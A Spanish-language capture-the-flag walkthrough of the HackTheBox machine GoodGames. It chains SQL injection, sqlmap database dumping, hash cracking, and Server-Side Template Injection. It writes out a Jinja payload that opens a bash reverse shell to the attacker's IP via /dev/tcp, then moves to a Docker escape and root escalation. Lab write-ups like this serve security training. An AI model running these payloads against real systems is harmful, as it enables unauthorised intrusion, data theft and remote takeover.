El día de hoy vamos a resolver la maquina GoodGames de HackTheBox. Es una maquina Linux - Medium

1. Enumeración inicial

Lo primero será un escaneo de puertos usando la herramienta nmap:

nmap -sC -sV -Pn -p80 10.129.96.71

Podemos ver que el puerto 80 (http) está abierto.

2. Website

Si entramos a la página web podemos ver que es un foro de videojuegos, si exploramos podemos ver que tiene una funcionalidad que nos permite crearnos una cuenta e iniciar sesión con ella.

Vamos a crearnos una cuenta para ver si podemos acceder a otras funcionalidades.

Cuando nos loggeamos podemos nuestro usuario con el cual nos registramos, ahora vamos a capturar con Burp Suite el requests de login.

3. Inyección SQL

Para poder capturar el requests modificamos el proxy de nuestro navegador o usamos la herramienta de FoxyProxy.

Una vez hecho lo anterior, capturamos el request logueándonos en la página.

Posteriormente probamos una inyección SQL básica y podemos ver como el inicio de sesión es efectuado y nos dumpea los usuarios.

Para poder acceder como adminpepito123 tenemos que acceder al link de la respuesta, para poder acceder con total normalidad tenemos que desactivar desactivar la captura de proxy en Burp Suite y luego cambiar la configuración del proxy a la normal o desactivar el FoxyProxy.

Como podemos ver ahora somos adminpepito123, Una vez siendo adminpepito123 navegamos por la página para ver si encontramos algo nuevo.

Como podemos ver se nos habilitó una nueva opción, pero al ingresar no carga la página, entonces tenemos que agregar el nuevo dominio al /etc/hosts

Después de agregar la IP con su dominio a /etc/hosts vemos que la página carga con normalidad

4. Inyección SQL con ayuda de SQLMAP

Si recordamos, anteriormente pudimos acceder siendo admin usando inyección SQL, eso quiere decir que podemos sacar la base datos usando la herramienda sqlmap. Vamos a sacar la base de datos.

Usamos el siguiente comando: 

sqlmap -u "http://10.129.96.71/login" --data="email=test&password=test" -p email --level=5 --risk=3 --dbs --batch

Vemos que logramos obtener una base de datos con el nombre main, ahora vamos a sacar la data.

Usamos el siguiente comando: 

sqlmap -u "http://10.129.96.71/login" --data="email=test&password=test" -p email --level=5 --risk=3 -D main --dump --batch

5. Cracking admin password

Como podemos ver logramos obtener los usuarios y las contraseñas hasheadas, vamos a usar una pagina para romper el hash de la contraseña del administrador o también podemos usar John the Ripper

Teniendo la contraseña del admin podemos acceder a la pagina que encontramos anteriormente Posteriormente exploraremos un poco la página.

Como podemos ver hay una funcionalidad en la página que nos permite cambiar nuestros datos, eso quiere decir que hay la posibilidad de que podamos explotar la vulnerabilidad de SSTI, pero tenemos que ver con que lenguaje está hecho la página.

6. Exploiting SSTI (Server-Side Template Injection)

Para saber en que lenguaje está hecho la página usaremos la herramienta whaweb.

Usamos el siguiente comando: 

whatweb http://internal-administration.goodgames.htb/settings

Vemos que está hecho con Python, eso quiere decir que podemos explotar SSTI, vamos a probarlo.

Vemos que si se puede, entonces podemos establecer una revershell, para esto nos vamos a ayudar de la página de Hacktricks para poder armar la revershell.

Como podemos ver nos dan los siguientes comandos para poder probar si es vulnerable y nos devuelve el id del usuario en este caso admin. Usaremos el ultimo para probarlo.

Vemos que el id del usuario admin es root, entonces ahora procedemos armar la revershell con ayuda de un generador, donde colocaremos nuestra IP con el puerto por donde se va a comunicar.

Usaremos el comando sacado de Hacktricks y cambiaremos en la parte del id por la revershell generada anteriormente cambiando un poco la estructura, quedaria así: 

'bash -c "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1"'

La revershell completa quedaria así: 

{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1"').read() }}

Abrimos una terminal y pones a la escucha con netcat usando el siguiente comando:

nc -lvnp 4444

Como podemos ver logramos establecer conexión con la revershell y entramos como root.

7. Docker Scape

Si hacemos un ls podemos ver que estamos en un docker, pero vamos a explorar un poco a ver si encontramos algo interesante.

Encontramos la flag del usuario.

Ahora intentamos conectarnos por SSH con el usuario augustus para escapar del docker.

Al querer conectarnos por SSH hacia el host (172.19.0.1) falla porque nuestra shell es básica y SSH requiere una terminal interactiva (TTY) para pedir credenciales. Solucionamos esto haciendo un tratamiento de la TTY usando Python antes de volver a conectarnos.

Usamos el siguiente comando: 

python3 -c 'import pty; pty.spawn("/bin/bash")'

Ahora intentamos nuevamente

Ahora si pudimos ingresar con total normalidad.

8. Escalada de privilegios

Para escalar privilegios al usuario root nos ayudaremos del docker, copiaremos bash al directorio de augustus.

Ahora asignaremos los permisos desde el docker y nos volveremos a conectar por SSH.

Ahora simplemente ejecutamos la bash de forma privilegiada y buscamos la flag de root.
